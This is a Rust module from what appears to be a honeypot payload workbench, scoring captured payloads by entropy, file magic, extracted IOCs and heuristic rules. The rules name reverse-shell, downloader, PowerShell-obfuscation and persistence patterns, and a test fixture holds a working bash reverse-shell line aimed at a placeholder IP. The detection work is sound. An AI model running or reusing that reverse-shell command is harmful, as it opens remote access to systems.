//! Deterministic local payload analysis for the Payload Workbench's
//! "deterministic" analyzer — Shannon entropy, IOC extraction, and a small
//! set of heuristic risk rules, ported from dashboard/payload_analysis.go's
//! `shannonEntropy`/`extractIOCs`/`payloadRules`/`magicName`.
//!
//! Deliberately excludes MD5/SHA1 hashing, ASCII/UTF-16 string extraction,
//! and base64/hex/URL-encoded artifact decoding — the run's own
//! `payload_sha256` is already the trusted content hash (workbench child
//! submission never depends on a freshly recomputed one, unlike Go's own
//! `trueSHA256` gap already documented in workbench_orchestrator.rs's
//! module comment), and the decode-artifacts pipeline is a much larger
//! surface than this bug fix (#1608 workstream H: the analyzer used to
//! unconditionally error) warrants porting in one pass.
//!
//! No YARA *matching* happens here, or anywhere in this crate: YARA
//! scanning is performed out of band by the deliberately networkless
//! analysis/yara/scanner.py service against the vendored corpus
//! (arcane/home/honeypot-payload-analysis/analysis/yara/rules/index.yar,
//! checked for loadability in quality.yml's own CI job) and mirrored into
//! the yara-analysis-v1 ES index by es-results-importer — the exact index
//! payload_detail.rs and worker.rs already read. This module's caller
//! (workbench_orchestrator's submit_child) fetches that same index and
//! passes any pre-scanned matches in here to fold into the risk score,
//! mirroring analyzePayloadFast's own YARA-boost logic; it never invokes a
//! YARA engine directly, same as the Go dashboard never did either.

use regex::Regex;
use serde::Serialize;
use std::collections::HashSet;
use std::sync::OnceLock;

/// Matches payload_analysis.go's analysisReadCap: entropy/magic/IOC/rule
/// extraction run over at most this many bytes of the payload, regardless
/// of the file's real size, so one outsized capture can't turn a workbench
/// submission into an unbounded read.
const ANALYSIS_READ_CAP: u64 = 16 << 20;

#[derive(Serialize, Clone, Debug)]
pub struct RuleMatch {
    pub name: String,
    pub severity: String,
    pub description: String,
}

#[derive(Serialize, Clone, Debug)]
pub struct StaticAnalysis {
    pub size_bytes: u64,
    pub magic: String,
    pub entropy: f64,
    pub packed_likely: bool,
    pub truncated: bool,
    pub iocs: Vec<String>,
    pub rules: Vec<RuleMatch>,
    pub yara_matches: Vec<String>,
    pub risk_score: i64,
    pub risk_level: &'static str,
}

/// Reads up to ANALYSIS_READ_CAP bytes of `path`, reporting the real
/// on-disk size alongside the (possibly truncated) buffer — mirrors the
/// read half of Go's payloadBytesForAnalysis/staticAnalysisFor without its
/// ES-mirror preference or its separate, larger payloadBytesRawCap gate
/// (this reads local disk directly, same posture reconcile_run's own
/// loadXResultsLocal calls already take — see this crate's module doc
/// comment on workbench_orchestrator.rs).
pub fn read_bounded(payload: &crate::host_fs::PayloadRef) -> std::io::Result<(Vec<u8>, u64)> {
    crate::host_fs::host().read_payload(payload, ANALYSIS_READ_CAP)
}

/// shannonEntropy: bits/byte of information density over `data`.
pub fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &byte in data {
        counts[byte as usize] += 1;
    }
    let len = data.len() as f64;
    counts
        .iter()
        .filter(|&&n| n > 0)
        .map(|&n| {
            let p = n as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// magicName: the same handful of fixed-offset signature checks
/// payload_kind.rs's classify_payload uses for routing, restated here as
/// the short display string payloadRules keys its "executable_payload"
/// check off (Go keeps these as two separate functions too — magicName
/// feeds binaryAnalysis.Magic, a display field, distinct from
/// classify_payload's routing decision).
fn magic_name(data: &[u8]) -> &'static str {
    if data.len() >= 2 && &data[..2] == b"MZ" {
        "Windows PE/DOS executable"
    } else if data.len() >= 4 && data[..4] == [0x7f, b'E', b'L', b'F'] {
        "ELF executable/shared object"
    } else if data.len() >= 4 && data[..4] == [b'P', b'K', 3, 4] {
        "ZIP/JAR/Office archive (not unpacked)"
    } else if data.len() >= 2 && &data[..2] == b"#!" {
        "script with interpreter shebang"
    } else if data.len() >= 4 && data[..4] == [0x89, b'P', b'N', b'G'] {
        "PNG image"
    } else {
        "unknown/raw data"
    }
}

const STRING_BOUNDARY_NOISE: &[char] = &['\'', '"', '`', '\\', '/', '|'];

/// cleanExtractedString: trims boundary noise a byte-range regex match
/// commonly glues onto real content, then drops anything with no
/// alphanumeric signal left (a pure separator run like "////").
fn clean_extracted_string(raw: &str) -> Option<String> {
    let trimmed = raw.trim().trim_matches(STRING_BOUNDARY_NOISE).trim();
    if trimmed.is_empty() || !trimmed.chars().any(|c| c.is_ascii_alphanumeric()) {
        return None;
    }
    Some(trimmed.to_string())
}

/// uniqueStrings: dedupes and caps a candidate list, dropping anything
/// clean_extracted_string rejects.
fn unique_strings(candidates: impl Iterator<Item = String>, limit: usize) -> Vec<String> {
    let mut seen = HashSet::new();
    candidates
        .filter_map(|raw| clean_extracted_string(&raw))
        .filter(|cleaned| seen.insert(cleaned.clone()))
        .take(limit)
        .collect()
}

fn ioc_patterns() -> &'static [Regex; 3] {
    static PATTERNS: OnceLock<[Regex; 3]> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        [
            Regex::new(r#"(?i)https?://[^\s'"<>]{4,300}"#).unwrap(),
            Regex::new(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b").unwrap(),
            Regex::new(
                r"(?i)\b[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+\b",
            )
            .unwrap(),
        ]
    })
}

/// extractIOCs: URLs, IPv4 addresses, and domain-shaped tokens over up to
/// 4MiB of `data`, capped at 80 matches per pattern before dedup/limit —
/// exact port of Go's extractIOCs.
pub fn extract_iocs(data: &[u8]) -> Vec<String> {
    let capped = &data[..data.len().min(4 << 20)];
    let text = String::from_utf8_lossy(capped);
    let mut matches = Vec::new();
    for pattern in ioc_patterns() {
        matches.extend(pattern.find_iter(&text).take(80).map(|m| m.as_str().to_string()));
    }
    unique_strings(matches.into_iter(), 120)
}

/// payloadRules: a small set of substring/heuristic checks over up to 2MiB
/// of lowercased `data`, each contributing to a capped 0-100 static risk
/// score. Skips Go's "encoded_embedded_content" rule (gated on
/// decodeArtifacts, not ported here — see module doc comment).
fn payload_rules(magic: &str, packed_likely: bool, data: &[u8]) -> (Vec<RuleMatch>, i64) {
    let capped = &data[..data.len().min(2 << 20)];
    let lower = String::from_utf8_lossy(capped).to_lowercase();
    let mut rules = Vec::new();
    let mut score = 0i64;
    let mut add = |name: &str, severity: &str, description: &str, points: i64| {
        rules.push(RuleMatch {
            name: name.to_string(),
            severity: severity.to_string(),
            description: description.to_string(),
        });
        score += points;
    };
    if magic.contains("executable") || magic.contains("ELF") {
        add("executable_payload", "high", "Native PE or ELF executable content", 35);
    }
    if packed_likely {
        add(
            "high_entropy_content",
            "medium",
            "Entropy is consistent with compressed, encrypted, or packed content",
            20,
        );
    }
    if lower.contains("powershell") && (lower.contains("-enc") || lower.contains("frombase64string")) {
        add(
            "powershell_obfuscation",
            "high",
            "PowerShell with encoded or Base64-decoded content",
            30,
        );
    }
    if lower.contains("wget ")
        || lower.contains("curl ")
        || lower.contains("invoke-webrequest")
        || lower.contains("downloadstring")
    {
        add(
            "network_downloader",
            "high",
            "Script retrieves additional content from the network",
            25,
        );
    }
    if lower.contains("/dev/tcp/")
        || lower.contains("nc -e")
        || lower.contains("bash -i")
        || lower.contains("socket.tcpclient")
    {
        add("reverse_shell_pattern", "critical", "Common reverse-shell primitives are present", 45);
    }
    if lower.contains("authorized_keys")
        || lower.contains("/etc/cron")
        || lower.contains("schtasks")
        || lower.contains("reg add ")
    {
        add(
            "persistence_pattern",
            "high",
            "Persistence-related paths or commands are present",
            30,
        );
    }
    (rules, score.min(100))
}

/// analyzePayloadFast's YARA-boost half: a pre-scanned match list (fetched
/// by the caller from yara-analysis-v1) bumps the static risk score by 25,
/// or 40 if any match name looks like a reverse-shell/encoded-execution
/// rule — exact port of the boost Go's analyzePayloadFast applies.
fn yara_boost(score: i64, yara_matches: &[String]) -> i64 {
    if yara_matches.is_empty() {
        return score;
    }
    let boost = if yara_matches.iter().any(|m| {
        let lower = m.to_lowercase();
        lower.contains("reverse_shell") || lower.contains("encoded_execution")
    }) {
        40
    } else {
        25
    };
    (score + boost).min(100)
}

/// analyzePayloadFast: computes the deterministic-analyzer's static
/// analysis result over `data` (already bounded by read_bounded), folding
/// in `yara_matches` (already fetched by the caller — see module doc
/// comment) for the risk-score boost.
pub fn analyze(data: &[u8], real_size: u64, yara_matches: Vec<String>) -> StaticAnalysis {
    let capped = &data[..data.len().min(ANALYSIS_READ_CAP as usize)];
    let entropy = shannon_entropy(capped);
    let packed_likely = entropy >= 7.2;
    let magic = magic_name(capped);
    let iocs = extract_iocs(capped);
    let (rules, base_score) = payload_rules(magic, packed_likely, capped);
    let risk_score = yara_boost(base_score, &yara_matches);
    let risk_level = crate::reports_data::risk_level(risk_score);
    StaticAnalysis {
        size_bytes: real_size,
        magic: magic.to_string(),
        entropy,
        packed_likely,
        truncated: real_size > ANALYSIS_READ_CAP,
        iocs,
        rules,
        yara_matches,
        risk_score,
        risk_level,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn entropy_of_empty_is_zero() {
        assert_eq!(shannon_entropy(&[]), 0.0);
    }

    #[test]
    fn entropy_of_uniform_byte_is_zero() {
        assert_eq!(shannon_entropy(&[7u8; 4096]), 0.0);
    }

    #[test]
    fn entropy_of_random_looking_bytes_is_high() {
        let data: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        assert!(shannon_entropy(&data) > 7.9);
    }

    #[test]
    fn extract_iocs_finds_url_and_ip_and_domain() {
        let sample = b"curl http://example.invalid/x -o /tmp/x; connect 10.0.0.5 evil.example.com";
        let iocs = extract_iocs(sample);
        assert!(iocs.iter().any(|s| s.starts_with("http://example.invalid")));
        assert!(iocs.iter().any(|s| s == "10.0.0.5"));
        assert!(iocs.iter().any(|s| s.contains("evil.example.com")));
    }

    #[test]
    fn payload_rules_flags_reverse_shell_and_downloader() {
        let sample = b"#!/bin/sh\ncurl http://example.invalid/x -o /tmp/x\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n";
        let (rules, score) = payload_rules("script with interpreter shebang", false, sample);
        let names: Vec<&str> = rules.iter().map(|r| r.name.as_str()).collect();
        assert!(names.contains(&"network_downloader"));
        assert!(names.contains(&"reverse_shell_pattern"));
        assert!(score > 0);
    }

    #[test]
    fn yara_boost_prefers_higher_boost_for_reverse_shell_rule_names() {
        assert_eq!(yara_boost(0, &[]), 0);
        assert_eq!(yara_boost(10, &["Some_Generic_Rule".to_string()]), 35);
        assert_eq!(
            yara_boost(90, &["Suspected_Reverse_Shell".to_string()]),
            100
        );
    }
}
